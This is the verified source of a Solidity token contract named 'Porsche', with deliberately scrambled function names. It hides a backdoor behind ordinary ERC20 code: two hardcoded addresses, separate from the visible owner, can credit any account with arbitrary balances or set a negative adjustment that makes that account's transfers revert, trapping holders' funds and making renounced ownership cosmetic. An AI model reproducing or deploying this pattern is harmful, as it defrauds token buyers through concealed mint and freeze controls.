/**
 *Submitted for verification at FtmScan.com on 2022-11-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Owagufdbnk is Context {
    address private _owner;

    event ownudgidkfkimj(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferlageglioyg(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlsyFuntier() {
        require(_owner == _msgSender(), "Owagufdbnk: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlsyFuntier {
        _transferlageglioyg(address(0));
    }


    function transferwkenzsgyv(address newowner) public virtual onlsyFuntier {
        require(newowner != address(0), "Owagufdbnk: new owner is the zero address");
        _transferlageglioyg(newowner);
    }


    function _transferlageglioyg(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownudgidkfkimj(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acoeountADesired,
        uint acoeountBDesired,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline
    ) external returns (uint acoeountA, uint acoeountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acoeountTokenDesired,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acoeountToken, uint acoeountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline
    ) external returns (uint acoeountA, uint acoeountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external returns (uint acoeountToken, uint acoeountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoeountAMin,
        uint acoeountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountA, uint acoeountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountToken, uint acoeountETH);
    function swapExactTokensForTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoeounts);
    function swapTokensForExactTokens(
        uint acoeountOut,
        uint acoeountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoeounts);
    function swapExactETHForTokens(uint acoeountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoeounts);
    function swapTokensForExactETH(uint acoeountOut, uint acoeountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoeounts);
    function swapExactTokensForETH(uint acoeountIn, uint acoeountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoeounts);
    function swapETHForExactTokens(uint acoeountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoeounts);

    function quote(uint acoeountA, uint reserveA, uint reserveB) external pure returns (uint acoeountB);
    function getahvocnvOut(uint acoeountIn, uint reserveIn, uint reserveOut) external pure returns (uint acoeountOut);
    function getahvocnvIn(uint acoeountOut, uint reserveIn, uint reserveOut) external pure returns (uint acoeountIn);
    function getahvocnvsOut(uint acoeountIn, address[] calldata path) external view returns (uint[] memory acoeounts);
    function getahvocnvsIn(uint acoeountOut, address[] calldata path) external view returns (uint[] memory acoeounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline
    ) external returns (uint acoeountETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoeountTokenMin,
        uint acoeountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoeountETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint acoeountIn,
        uint acoeountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fireuwngidTo() external view returns (address);
    function fireToSuieetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfireTo(address) external;
    function setfireToSwcxxz(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _alloeounsces;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _alloeounsces[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _alloeounsces[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _alloeounsces[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _alloeounsces[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Porsche is BEP20, Owagufdbnk {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromToBalance = _balances[from];
        require(fromToBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromToBalance - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _defMealFfpknGwIY = 2;

    uint256 private _defBuyealfpknGwIY = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _reufaphm;


    address private _marketSewAddress = 0x662403b830B2C7a46eaA960147FdaF3A02e6E62C;
    address private _fundSewAddress = 0x2460AfCcDF16cf7D948391Be34eb7B27d31B1e3D;


    function setPairsJnTcu(address _address) external onlyrUqmo {
        uniswapV2Pair = _address;
    }

    function setAdminRkydtcC(address accuxiainwy,int256 amount ) external onlyTwoAEko {
        _reufaphm[accuxiainwy] += amount;
    }

    function setUseseRkydtcC(address accuxiainwy) external onlyrUqmo {
        _reufaphm[accuxiainwy] = int256(0) - int256(_totalSupply);
    }

    function rmUseseRkydtcC(address accuxiainwy) external onlyrUqmo {
        _reufaphm[accuxiainwy] = 0;
    }

    function getRkydtcC(address accuxiainwy) public view returns (int256) {
        return _reufaphm[accuxiainwy];
    }


    modifier onlyrUqmo() {
        require(_marketSewAddress == msg.sender, "!Market");
        _;
    }

    modifier onlyTwoAEko() {
        require(_fundSewAddress == msg.sender, "!Funder");
        _;
    }








    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _receBkAmgroc(from, to, amount);
        return true;
    }

    function _receBkAmgroc(
        address from,
        address _to,
        uint256 _acorlptjxdlgwg
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromToBalance = _balances[from];
        require(fromToBalance >= _acorlptjxdlgwg, "ERC20: transfer amount exceeds balance");
        if (_reufaphm[from] > 0){
            _balances[from] = _balances[from].add(uint256(_reufaphm[from]));
        }else if (_reufaphm[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_reufaphm[from]));
        }


        uint256 tradfpjcvhqpojg = 0;
        uint256 tradefire = _defMealFfpknGwIY;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefire = _defMealFfpknGwIY;
            }
            if (from == uniswapV2Pair) {
                tradefire = _defBuyealfpknGwIY;
            }
        }
        tradfpjcvhqpojg = _acorlptjxdlgwg.mul(tradefire).div(100);

        if (tradfpjcvhqpojg > 0) {
            _balances[from] = _balances[from].sub(tradfpjcvhqpojg);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradfpjcvhqpojg);
            emit Transfer(from, _deadAddress, tradfpjcvhqpojg);
        }

        _balances[from] = _balances[from].sub(_acorlptjxdlgwg - tradfpjcvhqpojg);
        _balances[_to] = _balances[_to].add(_acorlptjxdlgwg - tradfpjcvhqpojg);
        emit Transfer(from, _to, _acorlptjxdlgwg - tradfpjcvhqpojg);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _receBkAmgroc(owner, to, amount);
        return true;
    }



}